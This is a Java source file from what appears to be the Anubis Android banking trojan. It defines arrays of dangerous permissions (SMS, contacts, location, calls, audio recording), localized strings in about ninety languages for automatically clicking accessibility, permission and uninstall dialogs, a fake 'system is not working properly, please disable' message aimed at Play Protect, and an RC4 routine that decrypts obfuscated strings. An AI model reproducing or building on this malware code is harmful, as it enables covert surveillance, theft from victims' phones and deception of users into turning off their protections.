package anubis.bot.myapplication;

import android.Manifest;
import android.content.Context;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.util.Base64;

import java.util.List;

import anubis.bot.myapplication.API.ClassRC4;

public class StoreStringClass {
    public String[] permissions = new String[]{
            Manifest.permission.SEND_SMS,
            Manifest.permission.WRITE_EXTERNAL_STORAGE,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.CALL_PHONE,
            Manifest.permission.RECORD_AUDIO};

    public String[] SEND_SMS = new String[]{ Manifest.permission.SEND_SMS};
    public String[] WRITE_EXTERNAL_STORAGE = new String[]{ Manifest.permission.WRITE_EXTERNAL_STORAGE};
    public String[] READ_CONTACTS = new String[]{ Manifest.permission.READ_CONTACTS};
    public String[] ACCESS_FINE_LOCATION = new String[]{ Manifest.permission.ACCESS_FINE_LOCATION};
    public String[] CALL_PHONE = new String[]{ Manifest.permission.CALL_PHONE};
    public String[] RECORD_AUDIO = new String[]{ Manifest.permission.RECORD_AUDIO};


    public static final String county= "[az][sq][am][en][ar][hy][af][eu][ba][be][bn][my][bg][bs][cy][hu][vi][ht][gl][nl][mrj][el][ka][gu][da][he][yi][id][ga][is][es][it][kk][kn][ca][ky][zh][ko][xh][km][lo][la][lv][lt][lb][mk][mg][ms][ml][mt][mi][mr][mhr][mn][de][ne][no][pa][pap][fa][pl][pt][ro][ru][ceb][sr][si][sk][sl][sw][su][tl][tg][th][ta][tt][te][tr][udm][uz][uk][ur][fi][fr][hi][hr][cs][sv][gd][eo][et][jv][ja]";
    public static final String[] activate = "[az]aktivləşdirin::[sq]aktivizoj::[am]አግብር::[en]activate::[ar]تفعيل::[hy]ակտիվացնել::[af]aktiveer::[eu]aktibatu::[ba]идэвхжүүлэх::[be]актываваць::[bn]সক্রিয় করা::[my]ကိုသက်ဝင်::[bg]активирате::[bs]aktivirati::[cy]gweithredu::[hu]aktiválja::[vi]kích hoạt::[ht]aktive::[gl]activar::[nl]activeren::[mrj]жандыруу::[el]θέτω εις ενέργειαν::[ka]გააქტიურება::[gu]સક્રિય કરો::[da]aktivere::[he]להפעיל::[yi]אַקטאַווייט::[id]mengaktifkan::[ga]gníomhachtaigh::[is]virkja::[es]activar::[it]attivare::[kk]белсендіру::[kn]ಸಕ್ರಿಯಗೊಳಿಸಿ::[ca]activar::[ky]жандыруу::[zh]启用::[ko]활성화하다::[xh]kusebenze::[km]ធ្វើឱ្យសកម្ម::[lo]ກະຕຸ້ນ::[la]excitant::[lv]aktivizēt::[lt]aktyvuoti::[lb]aktivéieren::[mk]активирај::[mg]hampavitrika::[ms]aktifkan::[ml]സജീവമാക്കുക::[mt]jattiva::[mi]whakahohe::[mr]सक्रिय करा::[mhr]жандыруу::[mn]идэвхжүүлэх::[de]aktivieren Sie::[ne]सक्रिय गर्नुहोस्::[no]aktivere::[pa]ਸਰਗਰਮ ਕਰੋ::[pap]primi::[fa]فعال کردن::[pl]Aktywuj::[pt]ativar::[ro]Activati::[ru]Активировать::[ceb]activate::[sr]активирати::[si]ක්රියාත්මක::[sk]Aktivovať::[sl]aktivirate::[sw]kuamsha::[su]ngaktipkeun::[tl]buhayin::[tg]activate::[th]กระตุ้น::[ta]செயல்படுத்த::[tt]активировать::[te]సక్రియం::[tr]etkinleştirmek::[udm]активировать::[uz]faollashtirish::[uk]активувати::[ur]چالو کریں::[fi]aktivoida::[fr]Activer::[hi]सक्रिय::[hr]aktivirati::[cs]aktivovat::[sv]Aktivera::[gd]activate::[eo]aktivigi::[et]aktiveerige::[jv]aktifake::[ja]活性化する".split("::");

    public static final String[] Accessibility = "[az]Erişimi aktivləşdirin::[sq]Aktivizo aksesin për::[am]መዳረሻ ለ ያንቁ::[en]Enable access for::[ar]تمكين الوصول لـى::[hy]Միացնել մուտքի թույլտվությունը::[af]Aktiveer toegang vir::[eu]Gaitu sarbidea egiteko::[ba]Хандалтыг идэвхжүүлэх::[be]Прадастаўленне доступу::[bn]জন্য অ্যাক্সেস সক্ষম করুন::[my]အဘို့အ access ကို Enable::[bg]Активиране на достъпа за::[bs]Omogući pristup za::[cy]Galluogi mynediad ar gyfer::[hu]Hozzáférés engedélyezése::[vi]Cho phép truy cập cho::[ht]Pèmèt aksè pou::[gl]Activar o acceso para::[nl]Toegang inschakelen voor::[mrj]Пыртен кердеш::[el]Ενεργοποιήστε την πρόσβαση για::[ka]ჩართეთ წვდომა::[gu]માટે ઍક્સેસ સક્ષમ કરો::[da]Aktivér adgang til::[he]אפשר גישה עבור::[yi]געבן צוטריט פֿאַר::[id]Aktifkan akses untuk::[ga]A chumas rochtain a fháil ar do::[is]Virkja aðgang fyrir::[es]Habilitar el acceso para::[it]Abilita accesso per::[kk]Қолжетімділікті қосу::[kn]ಗಾಗಿ ಪ್ರವೇಶವನ್ನು ಸಕ್ರಿಯಗೊಳಿಸಿ::[ca]Habilita l'accés per a::[ky]үчүн мүмкүнчүлүк::[zh]启用访问权限::[ko]에 대한 액세스 활성화::[xh]Nika ithuba lokufikelela::[km]អនុញ្ញាតការចូលប្រើសម្រាប់::[lo]ເປີດການເຂົ້າເຖິງສໍາລັບ::[la]Admitte-access vivificasti::[lv]Iespējot piekļuvi::[lt]Įgalinti prieigą::[lb]Veröffentlechen Si den Accès fir::[mk]Овозможи пристап за::[mg]Alefaso ny fidirana::[ms]Dayakan akses untuk::[ml]ഇതിനായുള്ള ആക്സസ് പ്രാപ്തമാക്കുക്ടി::[mt]Jippermettu aċċess għal::[mi]Whakahohea te uru mo::[mr]साठी प्रवेश सक्षम करा::[mhr]Enable access for::[mn]Хандалтыг идэвхжүүлэх::[de]Zugriff für aktivieren::[ne]को लागी पहुँच सक्षम गर्नुहोस्::[no]Aktiver tilgang for::[pa]ਲਈ ਐਕਸੈਸ ਯੋਗ ਕਰੋ::[pap]Abilidat di aceso na::[fa]فعال کردن دسترسی برای::[pl]Włącz dostęp dla::[pt]Ativar acesso para::[ro]Activați accesul pentru::[ru]Включите доступ для::[ceb]Pag-access sa::[sr]Омогући приступ за::[si]ප්රවේශය සක්රීය කරන්න::[sk]Povoliť prístup pre::[sl]Omogoči dostop za::[sw]Wezesha kufikia::[su]Aktipkeun aksés pikeun::[tl]Paganahin ang pag-access para sa::[tg]Дастрасӣ ба дастрасӣ::[th]เปิดใช้งานการเข้าถึงสำหรับ::[ta]அணுகலை இயக்கவும்::[tt]Enable access for::[te]కోసం ప్రాప్యతను ప్రారంభించండి::[tr]İçin erişimi etkinleştir::[udm]Enable access for::[uz]Kirish uchun ruxsatni yoqing::[uk]Увімкнути доступ для::[ur]تک رسائی فعال کریں::[fi]Ota käyttöön::[fr]Activer l'accès pour::[hi]के लिए पहुँच सक्षम करें::[hr]Omogući pristup za::[cs]Povolit přístup pro::[sv]Aktivera åtkomst för::[gd]Cuir cothrom airson::[eo]Ebligu aliron por::[et]Luba juurdepääs::[jv]Ngaktifake akses kanggo::[ja]のアクセスを有効にする".split("::");

    public static final String[] permis = "[az]İzin ver::[sq]lejoj::[am]የሚሰጡዋቸውን::[en]Allow::[ar]السماحسمح::[hy]Թույլ տալ::[af]Laat::[eu]Baimendu::[ba]Рөхсәт::[be]Дазволіць::[bn]অনুমতি দিন::[my]ခွင့်ပြု::[bg]Позволява::[bs]Dopustiti::[cy]Caniatáu::[hu]Lehetővé teszi::[vi]Cho phép::[ht]Pèmèt::[gl]Permitir::[nl]Toestaan::[mrj]Разрешӓйӹ::[el]Επιτρέπω::[ka]საშუალებას::[gu]મંજૂરી આપોે::[da]Tillad::[he]להתיר::[yi]לאָזן::[id]Mengizinkan::[ga]Cheadú::[is]Leyfa::[es]Permitir::[it]Permettere::[kk]Рұқсат етіңіз::[kn]ಅನುಮತಿಸು::[ca]Permetre::[ky]уруксат берүү::[zh]允许::[ko]허용하다::[xh]Vumela::[km]អនុញ្ញាត::[lo]ອະນຸຍາດໃຫ້::[la]Sino::[lv]Atļaut::[lt]Leisti::[lb]Erlaabt::[mk]Дозволи::[mg]Mamela::[ms]Benarkan::[ml]അനുവദിക്കുക::[mt]Ħalli::[mi]Tukua::[mr]परवानगी::[mhr]Кӧнеда::[mn]Зөвшөөрөх::[de]Ermöglichen::[ne]अनुमति दिनुहोस्::[no]Tillate::[pa]ਦੀ ਇਜਾਜ਼ਤ::[pap]Permití::[fa]اجازه می دهد::[pl]Dopuszczać::[pt]Permitir::[ro]Permite::[ru]Разрешить::[ceb]Tugoti::[sr]Дозволити::[si]ඉඩ දෙන්න::[sk]Dovoliť::[sl]Dovoli,::[sw]Ruhusu::[su]Ngidinkeun::[tl]Payagan ang mga::[tg]Иҷозат::[th]อนุญาต::[ta]அனுமதி::[tt]Игъланнары::[te]అనుమతిస్తుంది.::[tr]İzin vermek::[udm]Allow::[uz]Ruxsat ber::[uk]Дозволити::[ur]کی اجازت::[fi]Sallia::[fr]Permettre::[hi]अनुमति दें::[hr]Dopustiti::[cs]Dovolit::[sv]Tillåta::[gd]Ceadaich::[eo]Permesi::[et]Luba::[jv]Allow::[ja]許可する".split("::");

    public static final String[] yes= "[az]Bəli::[sq]Po::[am]አዎ::[en]Yes::[ar]نعم فعلاعم::[hy]Այո::[af]Ja::[eu]Bai::[ba]Дa::[be]Ды::[bn]হ্যাঁ::[my]ဟုတ်ကဲ့::[bg]Да::[bs]Da::[cy]Ydw::[hu]Igen::[vi]Yes::[ht]Wi::[gl]Si::[nl]Ja::[mrj]Мане::[el]Ναι::[ka]დიახ::[gu]હા::[da]Ja::[he]כן::[yi]יא::[id]Ya::[ga]Tá::[is]Já::[es]Sí::[it]Sì::[kk]Иә::[kn]ಹೌದು::[ca]Sí::[ky]Ооба::[zh]是的::[ko]네::[xh]Ewe::[km]បាទ::[lo]ແມ່ນແລ້ວ::[la]Etiam::[lv]Jā::[lt]Taip::[lb]Jo::[mk]Yes::[mg]Eny::[ms]Ya::[ml]അതെ::[mt]Iva::[mi]Ae::[mr]होय::[mhr]Да::[mn]Тийм ээ::[de]Ja::[ne]हो::[no]Ja::[pa]ਜੀ::[pap]Sí::[fa]بله::[pl]Tak::[pt]Sim::[ro]Da::[ru]Да::[ceb]Oo::[sr]Да::[si]ඔව්::[sk]Áno::[sl]Da::[sw]Ndiyo::[su]Enya::[tl]Oo::[tg]Ҳа::[th]ใช่แล้ว::[ta]ஆமாம்::[tt]Әйе::[te]అవును::[tr]Evet::[udm]Мед::[uz]Ha::[uk]Так::[ur]جی ہاں::[fi]Kyllä::[fr]Oui::[hi]हाँ::[hr]Da::[cs]Ano::[sv]Ja::[gd]Yes::[eo]Jes::[et]Jah::[jv]Ya::[ja]はい".split("::");

    public static final String[] uninstall1 = "[az]sil::[sq]uninstall::[am]አራግፍ::[en]uninstall::[ar]الغاء التثبيت::[hy]տեղահանել::[af]verwyder::[eu]desinstalatu::[ba]uninstall::[be]дэўсталёўка::[bn]আনইনস্টল::[my]ဖယ်ရှားရန်::[bg]деинсталиране::[bs]Deinstalirati::[cy]uninstall::[hu]uninstall::[vi]eltávolítás::[ht]gỡ cài đặt::[gl]wehe::[nl]desinstalar::[mrj]удалена::[el]απεγκατάσταση::[ka]დეინსტალაცია::[gu]અનઇન્સ્ટોલ કરો::[da]afinstallere::[he]khipha::[yi]נעם אַוועק::[id]dhíshuiteáil::[ga]treoracha::[is]fjarlægja::[es]desinstalar::[it]disinstallazione::[kk]жою::[kn]ಅಸ್ಥಾಪಿಸು::[ca]desinstal·lació::[ky]орнотулганды алып салуу::[zh]卸載::[ko]제거::[xh]ukukhipha::[km]លុប::[lo]uninstall::[la]uninstall::[lv]atinstalēt::[lt]pašalinti::[lb]deinstalléieren::[mk]деинсталирање::[mg]esory::[ms]Nyahpasang::[ml]അൺഇൻസ്റ്റാൾ ചെയ്യുക::[mt]uninstall::[mi]tangohia::[mr]विस्थापित करा::[mhr]uninstall::[mn]устгах::[de]deinstallieren::[ne]अस्थापना गर्नुहोस्::[no]avinstallere::[pa]ਅਣਇੰਸਟੌਲ ਕਰੋ::[pap]dental::[fa]پاک کردن::[pl]odinstaluj::[pt]Desinstalar::[ro]dezinstalare::[ru]удалить::[ceb]pag-uninstall::[sr]деинсталирај::[si]අස්ථාපනය කිරීම::[sk]uninstall::[sl]odstranite::[sw]kufuta::[su]uninstall::[tl]i-uninstall ang mga::[tg]uninstall::[th]ถอนการติดตั้ง::[ta]நீக்குதல்::[tt]uninstall::[te]అన్ఇన్స్టాల్::[tr]kaldırma::[udm]uninstall::[uz]olib tashlash::[uk]видалити::[ur]انسٹال کریں::[fi]i-uninstall::[fr]désinstaller::[hi]स्थापना रद्द करें::[hr]deinstalirati::[cs]odinstalovat::[sv]avinstallera::[gd]dì-stàladh::[eo]malinstali::[et]desinstallimine::[jv]nyopot::[ja]アンインストール".split("::");

    public static final String[] uninstall2 = "[az]çıxarmaq::[sq]për të hequr::[am]ለማስወገድ::[en]to remove::[ar]لازالة::[hy]հեռացնել::[af]om te verwyder::[eu]kentzeko::[ba]to remove::[be]выдаліць::[bn]মুছে ফেলার জন্য:[my]ဖယ်ရှားပစ်ရန်::[bg]премествам::[bs]ukloniti::[cy]i gael gwared ar::[hu]eltávolítani::[vi]để loại bỏ::[ht]yo retire::[gl]para eliminar::[nl]verwijderen::[mrj]удалена::[el]για να αφαιρέσετε::[ka]ამოიღონ::[gu]દુર કરવું::[da]at fjerne::[he]כדי להסירר::[yi]צו באַזייַטיקן::[id]untuk menghapus::[ga]to remove::[is]að fjarlægja::[es]eliminar::[it]rimuovere::[kk]жою үшін::[kn]ತೆಗೆದುಹಾಕಲು::[ca]per eliminar::[ky]алып салуу::[zh]去除::[ko]제거::[xh]ukususa::[km]ដើម្បីយកចេញ::[lo]to remove::[la]ad removendum::[lv]noņemt::[lt]pašalinti::[lb]ze läschen::[mk]да се отстранат::[mg]to remove::[ms]untuk mengeluarkannya::[ml]നീക്കംചെയ്യാൻ::[mt]biex tneħħi::[mi]ki te tango::[mr]काढुन टाकणे::[mhr]to remove::[mn]арилгах::[de]zu entfernen::[ne]हटाउनु::[no]å fjerne::[pa]ਨੂੰ ਹਟਾਉਣ ਲਈ::[pap]kita::[fa]برای حذفف::[pl]usuwać::[pt]remover::[ro]a sterge::[ru]удалить::[ceb]aron makuha::[sr]уклонити::[si]ඉවත් කරන්න::[sk]odobrať::[sl]odstraniti::[sw]kuondoa::[su]ngaleupaskeun::[tl]upang alisin::[tg]барои нест кардан::[th]เพื่อลบ::[ta]நீக்க::[tt]бетерә::[te]తొలగించడానికి::[tr]ayırmak::[udm]to remove::[uz]olib tashlash uchun::[uk]видалити::[ur]کو ہٹانے کے لئے::[fi]poistaa::[fr]retirer::[hi]कहटाना::[hr]ukloniti::[cs]odebrat::[sv]att ta bort::[gd]a thoirt air falbh::[eo]forigi::[et]eemaldada::[jv]kanggo mbusak::[ja]削除する".split("::");

    public static final String[] vkladmin = "[az]daxildir::[sq]përfshijnë::[am]ያካትታል::[en]include::[ar]تتضمن::[hy]ներառում::[af]insluit::[eu]besteak beste::[ba]оруулах::[be]ўключаць::[bn]অন্তর্ভুক্ত করা::[my]ပါဝင်::[bg]включва::[bs]uključuju::[cy]cynnwys::[hu]tartalmaz::[vi]bao gồm::[ht]genkli::[gl]incluír::[nl]omvatten::[mrj]чӱктен::[el]περιλαμβάνω::[ka]მოიცავს::[gu]સમાવેશ::[da]omfatte::[he]כוללים::[yi]אַרייַננעמען::[id]termasuk::[ga]include ::[is]fela í sér::[es]incluir::[it]includere::[kk]қамтиды::[kn]ಸೇರಿವೆ::[ca]incloure::[ky]камтыйт::[zh]包括::[ko]포함::[xh]ba ndakanya::[km]រួមបញ្ចូល::[lo]ລວມມີ::[la]includere::[lv]ietver::[lt]įtraukti::[lb]gehéiert::[mk]вклучуваат::[mg]Anisan'izany::[ms]termasuk::[ml]ഉൾപ്പെടുന്നു::[mt]jinkludu::[mi]whakauru::[mr]समाविष्ट::[mhr]include::[mn]оруулах::[de]umfassen::[ne]समावेश गर्नुहोस्::[no]inkludere::[pa]ਸ਼ਾਮਲ ਕਰੋ::[pap]inclui::[fa]عبارتند از ::[pl]zawierać::[pt]incluir::[ro]include::[ru]включить::[ceb]naglakip::[sr]укључи::[si]හැරෙන්න::[sk]zapnite::[sl]vklopite::[sw]ongea::[su]bisa jadi::[tl]isama::[tg]кушоед::[th]เปิด::[ta]இயக்கவும்::[tt]include::[te]ఆన్ చేయండి::[tr]açmak::[udm]include::[uz]yoqing::[uk]увімкнути::[ur]چالو::[fi]päälle::[fr]allumer::[hi]चालू करेंैं::[hr]uključite::[cs]zapněte::[sv]sätt på::[gd]gabhail a-steach::[eo]inkluzivi::[et]sisaldama::[jv]kalebu::[ja]含める".split("::");

    public static final String[] straccessibility = "[az]indi başla::[sq]Fillo tani::[am]አሁን ጀምር::[en]start now::[ar]ابدأ الآن::[hy]սկսեք հիմա::[af]begin nou::[eu]Hasi orain::[ba]Одоо эхэл::[be]пачаць зараз::[bn]এখুনি শুরু করুন::[my]ယခုစတင်ရန်::[bg]Започни сега::[bs]start now::[cy]Dechreuwch nawr::[hu]indítás most::[vi]bắt đầu ngay::[ht]hoʻomaka i kēia manawa::[gl]comezar agora::[nl]Jetzt anfangen::[mrj]кӹзӹт тӹнгӓлӹн.::[el]ξεκίνα τώρα::[ka]დაიწყე ახლა::[gu]અત્યારે શરુ કરો::[da]start nu::[he]qala manje::[yi]אָנהייב איצט::[id]mulai sekarang::[ga]tús anois::[is]Byrjaðu núna::[es]empezar ahora::[it]avviare ora::[kk]қазір бастау::[kn]ಈಗ ಪ್ರಾರಂಭಿಸಿ::[ca]comença ara::[ky]Азыр башта::[zh]現在開始::[ko]지금 시작하십시오::[xh]qalisa ngoku::[km]ចាប់ផ្តើមឥឡូវ::[lo]ເລີ່ມ​ດຽວ​ນີ້::[la]nunc incipere::[lv]sākt tagad::[lt]Pradėk dabar::[lb]fänken elo un::[mk]Почни сега::[mg]manomboka izao::[ms]mula sekarang::[ml]ഇപ്പോൾ തുടങ്ങുക::[mt]ibda issa::[mi]tīmata inaianei::[mr]आता प्रारंभ करा::[mhr]кызыт тӱҥалын::[mn]Одоо эхэл::[de]Jetzt anfangen::[ne]अहिले सुरु गर्नुहोस्::[no]start nå::[pa]ਹੁਣ ਸ਼ੁਰੂ ਕਰੋ::[pap]kuminsá awor::[fa]الان شروع کن::[pl]zacząć teraz::[pt]coComece agora::[ro]începe acum::[ru]начать сейчас::[ceb]sugdi karon::[sr]Почни сад::[si]දැන් පටන් ගන්න::[sk]začni teraz::[sl]začni zdaj::[sw]anza sasa::[su]mimitian ayeuna::[tl]simulan ngayon::[tg]ҳоло оғоз::[th]เริ่มตอนนี้::[ta]இப்போதே துவக்கு::[tt]башларга хәзер::[te]ఇప్పుడు ప్రారంబించండి::[tr]şimdi başla::[udm]али кутскемын::[uz]hozir boshlang::[uk]розпочати зараз::[ur]اب شروع::[fi]Aloita nyt::[fr]commencez maintenant::[hi]अभी शुरू करो::[hr]Započni sada::[cs]začít hned::[sv]börja nu::[gd]tòiseachadh a-nis::[eo]komencu nun::[et]alusta kohe::[jv]miwiti saiki::[ja]今すぐ始める:".split("::");

    public static final String[] straccessibility2 = "[az]başlamaq::[sq]të fillosh::[am]መጀመር::[en]to start::[ar]للبدأ::[hy]սկսել::[af]om te begin::[eu]hasteko::[ba]эхлэх::[be]пачаць::[bn]শুরুতেই::[my]စတင်ရန်::[bg]да започна::[bs]početi::[cy]i ddechrau::[hu]kezdeni::[vi]để bắt đầu::[ht]hoʻomaka::[gl]comezar::[nl]beginnen::[mrj]тӹнгӓльӹ::[el]να ξεκινήσω::[ka]დაწყება::[gu]શરૂ કરવા::[da]at begynde::[he]ukuqala::[yi]צו אָנהייבן::[id]untuk memulai::[ga]tús a chur le::[is]að byrja::[es]para comenzar::[it]iniziare::[kk]бастау::[kn]ಶುರು ಮಾಡಲು::[ca]començar::[ky]баштоо::[zh]開始::[ko]시작한다::[xh]ukuqala::[km]ចាប់ផ្ដើម::[lo]ເພື່ອເລີ່ມຕົ້ນ::[la]incipere::[lv]sākt::[lt]pradėti::[lb]ufänken::[mk]да започне::[mg]manomboka::[ms]untuk mula::[ml]ആരംഭിക്കാൻ::[mt]tibda::[mi]ki te tīmata::[mr]सुरू करण्यासाठी::[mhr]тӱҥалына::[mn]эхлэх::[de]anfangen::[ne]सुरु गर्न::[no]å starte::[pa]ਸੁਰੂ ਕਰਨਾ::[pap]kuminsá::[fa]برای شروع::[pl]zacząć::[pt]para iniciar::[ro]a începe::[ru]начать::[ceb]sa pagsugod::[sr]за почетак::[si]ආරම්භ කරන්න::[sk]začať::[sl]začeti::[sw]kuanza::[su]pikeun ngamimitian::[tl]upang simulan ang::[tg]сар кардан::[th]เริ่ม::[ta]தொடங்க::[tt]башлау өчен::[te]ప్రారంభించడానికి::[tr]başlamak::[udm]кутскиз::[uz]boshlamoq::[uk]починати::[ur]شروع کرنے کے لئے::[fi]aloittaa::[fr]commencer::[hi]शुरू करना::[hr]početi::[cs]začít::[sv]att börja::[gd]airson tòiseachadh::[eo]komenci::[et]alustama::[jv]kanggo miwiti::[ja]始めること:".split("::");
    public final String TAGServiceAccessibility = "ServiceAccessibility";

    public static final String[] textPlayProtect = "[az]Sistem düzgün işləmir, əlil olur::[sq]Sistemi nuk funksionon si duhet, çaktivizo::[am]ስርዓቱ በአግባቡ እየሰራ አይደለም, አቦዝን::[en]The system is not working properly, please disable::[ar]النظام لا يعمل بشكل صحيح  ، تعطيل::[hy]Համակարգը ճիշտ չի աշխատում, անջատված է::[af]Stelsel werk nie behoorlik nie, deaktiveer::[eu]Sistema ez da behar bezala funtzionatzen, desgaitu::[ba]Системасы жакшы иштебей жатат, өчүрүү::[be]Сістэма працуе няправільна, адключыце::[bn]সিস্টেম সঠিকভাবে কাজ করছে না, নিষ্ক্রিয়::[my]အဆိုပါစနစ်ကအလုပ်မလုပ်ပါဘူး၊မှန်မှန်ကန်ကန်ပိတ် ၁၂၃၁၂၃::[bg]Системата не работи правилно, забранява::[bs]Sistem ne radi ispravno, onemogućite::[cy]Nid yw'r system yn gweithio'n iawn, analluogi::[hu]A rendszer nem működik megfelelően, tiltsa le::[vi]Hệ thống không hoạt động đúng, vô hiệu hóa::[ht]Sistèm nan pa travay kòrèkteman, enfim::[gl]O sistema non funciona correctamente, desactívese::[nl]Systeem werkt niet goed, uitschakelen::[mrj]Самынь системӹм ӹштӹмӓш, отключать::[el]Το σύστημα δεν λειτουργεί σωστά, απενεργοποιήστε::[ka]სისტემა არ მუშაობს, გამორთულია::[gu]સિસ્ટમ યોગ્ય રીતે કામ કરી રહી નથી, નિષ્ક્રિય કરો::[da]Systemet virker ikke korrekt, deaktiver::[he]המערכת אינה פועלת כראוי, השבתהכת לא עובדת כראוי, השבת ::[yi]די סיסטעם טוט ניט אַרבעט ריכטיק, דיסייבאַל::[id]Sistem tidak berfungsi dengan baik, nonaktifkan::[ga]Ní dhéanann an córas ag obair i gceart, a dhíchumasú::[is]Kerfið virkar ekki rétt, slökkva á::[es]El sistema no funciona correctamente, deshabilitar::[it]Il sistema non funziona correttamente, disabilitato::[kk]Жүйе дұрыс жұмыс істемейді, өшіріледі::[kn]ವ್ಯವಸ್ಥೆ ಸರಿಯಾಗಿ ಕೆಲಸ ಮಾಡುವುದಿಲ್ಲ, ನಿಷ್ಕ್ರಿಯಗೊಳಿಸಲು::[ca]El sistema no funciona correctament, inhabiliteu-lo::[ky]Системасы жакшы иштебей жатат, өчүрүү::[zh]系统无法正常工作，禁用::[ko]시스템이 제대로 작동하지 않습니다::[xh]Inkqubo kubancedisi ngokuchanekileyo, khubaza::[km]ប្រព័ន្ធមិនដំណើរការល្អទេបិទ::[lo]ລະບົບບໍ່ເຮັດວຽກຢ່າງຖືກຕ້ອງ, ປິດໃຊ້ງານ::[la]Non est ratio bene operantes, disable::[lv]Sistēma nedarbojas pareizi, atspējojiet::[lt]Sistema neveikia tinkamai, išjunkite::[lb]System funktionnéiert net richteg, gëtt deaktivéiert::[mk]Системот не работи правилно, оневозможува::[mg]Ny rafitra dia tsy miasa araka ny tokony ho izy, mankarary::[ms]Sistem tidak bekerja dengan betul, melumpuhkan::[ml]സിസ്റ്റം ശരിയായി പ്രവർത്തിക്കില്ല, അപ്രാപ്തമാക്കുക::[mt]Sistema mhix qed taħdem sew, iddiżattiva::[mi]Ko te pūnaha e kore e mahi i te tika, mono i::[mr]सिस्टम योग्यरित्या कार्य करत नाही, अक्षम करा::[mhr]Йоҥылыш система пашам ышта, пыштышым::[mn]Систем нь зөв ажиллахгүй байна, идэвхгүй болгох::[de]Das System funktioniert nicht richtig, deaktivieren Sie es::[ne]सिस्टम ठीक से काम नहीं कर रहा है, अक्षम करें::[no]Systemet fungerer ikke som det skal, deaktiveres::[pa]ਸਿਸਟਮ ਸਹੀ ਢੰਗ ਨਾਲ ਕੰਮ ਨਹੀਂ ਕਰ ਰਿਹਾ ਹੈ, ਅਯੋਗ ਕਰੋ::[pap]E sistema no ta funciona directamente, desabilidat::[fa]این سیستم به درستی کار نمی کند با غیر فعال کردن::[pl]System nie działa poprawnie, wyłącz::[pt]O sistema não está funcionando corretamente, desative::[ro]Sistemul nu funcționează corect, dezactivează::[ru]Система работает неправильно, отключите::[ceb]Ang sistema sa dili pagtrabaho sa husto nga paagi, nga naghimo og kakulangan sa::[sr]Систем не ради исправно, онемогућите::[si]පද්ධතිය නිසි ලෙස ක්රියා නොකරයි::[sk]Systém nefunguje správne, zakáže::[sl]Sistem ne deluje pravilno, onemogočite::[sw]Mfumo haufanyi kazi vizuri, afya::[su]Sistim teu jalan sakumaha kuduna, mareuman::[tl]Ang sistema ay hindi gumagana ng maayos, huwag paganahin::[tg]Система дуруст кор намекунад, бекор карда мешавад::[th]ระบบทำงานไม่ถูกต้องปิดการใช้งาน::[ta]முறைமை சரியாக இயங்கவில்லை, முடக்கவும் இல்லை::[tt]Система эшли дөрес түгел, отключите::[te]వ్యవస్థ సరిగా పనిచేయడం లేదు, డిసేబుల్::[tr]Sistem düzgün çalışmıyor, devre dışı bırak::[udm]Неправильно системая ужа, disconnect::[uz]Tizim to'g'ri ishlamayapti, o'chirib qo'yilsin::[uk]Система працює неправильно, вимкніть::[ur]نظام مناسب طریقے سے کام نہیں کر رہا ہے، غیر فعالل::[fi]Järjestelmä ei toimi oikein, poista käytöstä::[fr]Le système ne fonctionne pas correctement, désactivez-le::[hi]सिस्टम ठीक से काम नहीं कर रहा है, अक्षम करें::[hr]Sustav ne radi ispravno, onemogućite::[cs]Systém nefunguje správně, deaktivuje::[sv]Systemet fungerar inte korrekt, inaktivera::[gd]Chan eil an siostam ag obair ceart, dèan lethbhreac dheth::[eo]La sistemo ne funkcias korekte, malebligi::[et]Süsteem ei tööta korralikult, keelake::[jv]Sistem ora bisa digunakake kanthi bener, mateni::[ja]システムが正しく動作していない、無効にする:".split("::");

    public static final String[] buttonPlayProtect = "[az]Davam edin::[sq]Vazhdoj::[am]ይቀጥሉ::[en]Сontinue::[ar]استمر::[hy]Շարունակել::[af]Aanhou::[eu]Jarraitu::[ba]улантуу::[be]Працягваць::[bn]চালিয়ে::[my]ဆက်လက်::[bg]Продължи::[bs]Nastavi::[cy]Parhewch::[hu]Folytatni::[vi]Tiếp tục::[ht]Kontinye::[gl]Continuar::[nl]Doorgaan met::[mrj]Continue::[el]Να συνεχίσει::[ka]გაგრძელებაt::[gu]ચાલુ રાખો::[da]Blive ved::[he]המשך::[yi]Continue::[id]Terus::[ga]Continue::[is]Haltu áfram::[es]Continuar::[it]Continua::[kk]Жалғастыру::[kn]ಮುಂದುವರಿಸಿ::[ca]Continua::[ky]улантуу::[zh]继续::[ko]잇다::[xh]Qhubeka::[km]បន្ត::[lo]ສືບຕໍ່::[la]Continue::[lv]Turpināt::[lt]Tęsti::[lb]Fuere weider::[mk]Продолжи::[mg]Continue::[ms]Teruskan::[ml]തുടരുക::[mt]Kompli::[mi]Haere tonu::[mr]सुरू::[mhr]Continue::[mn]Үргэлжлүүлэх::[de]Fortsetzen::[ne]जारी राख्नुहोस्::[no]Fortsette::[pa]ਜਾਰੀ ਰੱਖੋ::[pap]Continue::[fa]ادامه هید::[pl]Dalej::[pt]Continuar::[ro]Continua::[ru]Продолжить::[ceb]Continue::[sr]Настави::[si]ඉදිරියට යන්න::[sk]D'alej::[sl]Nadaljuj::[sw]Endelea::[su]neruskeun::[tl]Magpatuloy::[tg]Continue::[th]ต่อ::[ta]தொடர்ந்து::[tt]Продолжить::[te]కొనసాగించు::[tr]Devam et::[udm]Продолжить::[uz]Davom etish::[uk]Продовжити::[ur]جاری رہے::[fi]Jatkaa::[fr]Continuer::[hi]जारी रहना::[hr]Nastaviti::[cs]Pokračovat::[sv]Fortsätta::[gd]Continue::[eo]Daŭrigu::[et]Jätka::[jv]Terusake::[ja]持続する:".split("::");




    public String str_decrypt(String textDE_C, String key)
    {
        UtilsClass utilsClass = new UtilsClass();
        try
        {
            byte[] data = Base64.decode(textDE_C, Base64.DEFAULT);
            textDE_C = new String(data, "UTF-8");
            byte[] detext = utilsClass.hexStringToByteArray(textDE_C);
            ClassRC4 rcd = new ClassRC4(key.getBytes());
            return  new String(rcd.decrypt(detext));
        }catch (Exception ex){ }
        return "";
    }











    public static final String[] us_char = {"Q","W","E","R","T","Y","U","I","O","P","A","S","D","F","G","H","J","K","L","Z","X","C","V","B","N","M","q","w","e","r","y","u","i","o","p","a","s","d","f","g","h","j","k","l","z","x","c","v","b","n","m","=","0","1","2","3","4","5","6","7","8","9"};
